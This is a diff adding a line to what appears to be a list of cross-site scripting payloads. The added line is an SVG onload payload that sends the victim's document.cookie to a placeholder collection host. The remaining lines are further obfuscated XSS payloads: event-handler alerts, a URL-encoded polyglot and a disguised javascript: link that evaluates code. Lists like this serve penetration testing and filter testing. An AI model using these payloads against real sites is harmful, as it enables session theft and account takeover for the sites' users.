@@ -1,3 +1,4 @@
+"><svg onx=() onload=(location.href='<BIN>/?mycookies='+document['cookie'])()>
 <video src="#" controls onwebkitplaybacktargetavailabilitychanged="alert(1)"></video>
 <img+border%3d3+alt%3djaVasCript%3a%2f*-%2f*%60%2f*%5c%60%2f*%26%23039%3b%2f*%26quot%3b%2f**%2f(%2f*+*%2foNcliCk%3dalert()+)%2f%2f%250D%250A%250d%250a%2f%2f%26lt%3b%2fstYle%2f%26lt%3b%2ftitLe%2f%26lt%3b%2fteXtarEa%2f%26lt%3b%2fscRipt%2f--!%26gt%3b%5cx3csVg%2f%26lt%3bsVg%2foNloAd%3dconfirm(%27Hassan%27)%2f%2f%26gt%3b%5cx3e>
 %3ca%2fhref%3d%22j%0A%0Davascript%3a%7bvar%7b3%3as,2%3ah,5%3aa,0%3av,4%3an,1%3ae%7d%3d'earltv'%7d[self][0][v%2ba%2be%2bs](e%2bs%2bv%2bh%2bn)(document.domain)%22%20%2f%3eclick
